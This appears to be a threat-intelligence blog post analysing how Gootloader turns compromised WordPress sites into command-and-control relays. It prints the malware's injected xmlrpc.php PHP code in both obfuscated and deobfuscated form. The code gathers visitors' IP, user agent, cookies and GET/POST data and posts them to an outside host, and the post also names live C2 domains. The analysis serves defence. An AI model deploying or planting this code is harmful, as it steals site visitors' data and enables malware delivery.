@@ -1,0 +1,123 @@
+Gootloader Command & Control
+gootloader.wordpress.com/2023/01/05/gootloader-command-control/
+
+January 5, 2023
+
+In the previous blog post What is Gootloader?, it was mentioned that Gootloader utilizes
+compromised WordPress sites. How these blogs are compromised, is still a mystery, but they
+belief is either weak administrator credentials, or vulnerabilities in the WordPress software (to
+include themes and plugins).
+
+Gootloader maintains persistence on a blog, by adding PHP code to various files, typically in
+the themes directory, but have also seen it in the plugins directory. Additionally, stored in the
+“wp_options” table, is base64 encoded PHP code is stored, this combination allows them to
+remotely run PHP code.
+
+This is not an advertisement for the WordPress plugin Wordfence, but it detects the
+malicious modifications of the files:
+
+The mechanism of redrawing the forum page is triggered via WordPress filters and actions. It
+is triggered if the following conditions are met:
+
+The visitor isn’t logged into the blog
+
+1/4
+
+
+
+The visitor’s class C subnet hasn’t visited the blog in the last 24 hours
+The visitor is visiting from an English-speaking country (or French/Korea for
+appropriate term)
+The visitor is on a Windows machine
+The visitor is not a crawler (for Google or Bing)
+
+If the above checks pass, the call out to the “mothership” my-game.biz/5.8.18.7, will cause
+the page to redraw the page to the forum image, as seen below:
+
+When the user clicks the link, it redirects to another Gootloader compromised WordPress
+site, with the URL ending in download.php (current as of 5Jan2023). This filename has
+changed over the years from content.php, search.php, mail.php, faq.php, news.php, and
+blog.php, but the code has stayed the same. No matter the name of the file, it reaches out to
+my-game.biz/5.8.18.7, for the malicious zipped .JS file.
+
+2/4
+
+
+
+Recently, the PowerShell code that runs via the scheduled task, calls out to 10 domains,
+some of which appear to be false positives. The URLs always end in xmlrpc.php, which is a
+legitimate WordPress file. However, they have modified it, to include their obfuscated code
+(see below).
+
+<?php goto boRJO; boRJO: $ch = curl_init(); goto fB1wY; jUCyr: curl_setopt($ch, 
+CURLOPT_POST, TRUE); goto HcxAz; IKqv7: curl_close($ch); goto bi3Dv; HcxAz: 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); goto b2dAn; N9o8z: $d = array("\151" 
+=> serialize($_SERVER["\122\x45\115\117\x54\x45\x5f\x41\x44\x44\122"]), "\x75" => 
+serialize($_SERVER["\x48\124\124\120\137\x55\123\105\122\x5f\x41\107\105\116\124"]), 
+"\x68" => serialize($_SERVER["\110\124\x54\x50\137\110\117\123\x54"]), "\x63" => 
+serialize($_COOKIE), "\147" => serialize($_GET), "\160" => serialize($_POST)); goto 
+nLmfD; H36HP: curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); goto N9o8z; bi3Dv: if 
+(strpos($r, "\x47\111\106\70\71") !== false) { 
+header("\x43\157\x6e\x74\145\x6e\164\55\124\x79\160\x65\x3a\x20\151\x6d\141\x67\x65\57
+echo $r; exit;} goto cmXKz; b2dAn: curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); goto 
+H36HP; fB1wY: curl_setopt($ch, CURLOPT_URL, 
+"\150\164\164\x70\163\x3a\x2f\57\x77\x77\x77\56\x69\x6e\x65\x72\x69\156\157\56\143\157
+goto jUCyr; LTTGw: $r = curl_exec($ch); goto IKqv7; nLmfD: curl_setopt($ch, 
+CURLOPT_POSTFIELDS, http_build_query($d)); goto LTTGw; cmXKz: ?> 
+
+Here is the code deobfuscated:
+
+<?php  
+$d = array( 
+   "i" => serialize($_SERVER["REMOTE_ADDR"]) , 
+   "u" => serialize($_SERVER["HTTP_USER_AGENT"]) , 
+   "h" => serialize($_SERVER["HTTP_HOST"]) , 
+   "c" => serialize($_COOKIE) , 
+   "g" => serialize($_GET) , 
+   "p" => serialize($_POST) 
+);
+
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_POST, true); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+curl_setopt($ch, CURLOPT_URL, https://www.inerino.co.za/index.php); 
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($d)); 
+
+$r = curl_exec($ch); 
+curl_close($ch); 
+
+if (strpos($r, "GIF89") !== false) 
+{ 
+   header("Content-Type: image/gif"); 
+   echo $r; 
+   exit; 
+} 
+?>
+
+3/4
+
+
+
+Basically, what happens above, is an infected host, will send a GET request with cookies full
+of juicy tidbits about the machine, to the xmlrpc.php, which will forward it on to the
+inerino.co.za domain.
+
+Update: If the Gootloader operator decides to send code back, it will be returned as a GIF
+with obfuscated PowerShell code embedded in it.
+
+Update 2: Given that GootLoader inserts the injected PHP block at the start of the
+xmlrpc.php file and the PHP inject only exits PHP execution when the gating check is passed
+on inerino[.]co[.]za, execution of xmlrpc.php will simply fall out of the injected GootLoader
+PHP block and continue execution of the legitimate XML-RPC PHP when the gating check
+fails. This means that a GET request to a GootLoader xmlrpc.php URL that fails the gating
+check will behave exactly like a GET request to an uninfected xmlrpc.php URL, making it
+difficult to tell false positive URLs from true positives.
+
+This is not an advertisement for the WordPress plugin Wordfence, but it detects the
+malicious modified xmlrpc.php as seen below:
+
+This inerino.co.za domain is new to Gootloader C2 and came about around 17 November
+2022. The domain is registered to Ivan Boldirev, who was a Serbian Canadian Hockey
+player. The SSL cert was generated around 17 October 2022.
